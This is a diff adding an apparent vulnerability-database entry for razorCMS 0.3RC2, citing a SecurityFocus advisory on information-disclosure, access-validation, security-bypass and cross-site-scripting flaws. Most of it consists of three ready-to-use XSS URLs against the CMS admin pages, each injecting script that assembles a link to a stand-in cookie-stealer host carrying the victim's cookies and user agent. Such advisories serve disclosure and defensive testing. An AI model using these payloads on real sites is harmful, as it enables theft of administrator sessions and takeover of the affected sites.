@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/34566/info
+
+razorCMS is prone to a local information-disclosure vulnerability, a local access-validation vulnerability, a security-bypass vulnerability, and multiple cross-site-scripting vulnerabilities.
+
+Attackers can exploit these issues to gain access to sensitive information, create denial-of-service conditions, gain elevated privileges, or execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. Successful exploits may aid in further attacks.
+
+razorCMS 0.3RC2 is vulnerable; other versions may also be affected.
+
+http://www.example.com/cms/admin/?action=edit&slab=home&#039;><script>alert(&#039;http://yourcookiestealer.org/evil.php?cookie=&#039;%20+%20encodeURI(document.cookie)%20+%20&#039;&useragent=&#039;%20+%20encodeURI(navigator.userAgent));</script><form
+
+http://www.example.com/cms/admin/?action=showcats&unpub=true&slabID=1&catname=sidebar&#039;><script>alert(&#039;http://yourcookiestealer.org/evil.php?cookie=&#039;%20+%20encodeURI(document.cookie)%20+%20&#039;&useragent=&#039;%20+%20encodeURI(navigator.userAgent));</script><form
+
+http://www.example.com/cms/admin/?action=reordercat&cat=sidebar&#039;><script>alert(&#039;http://yourcookiestealer.org/evil.php?cookie=&#039;%20+%20encodeURI(document.cookie)%20+%20&#039;&useragent=&#039;%20+%20encodeURI(navigator.userAgent));</script><form&param=0,1 
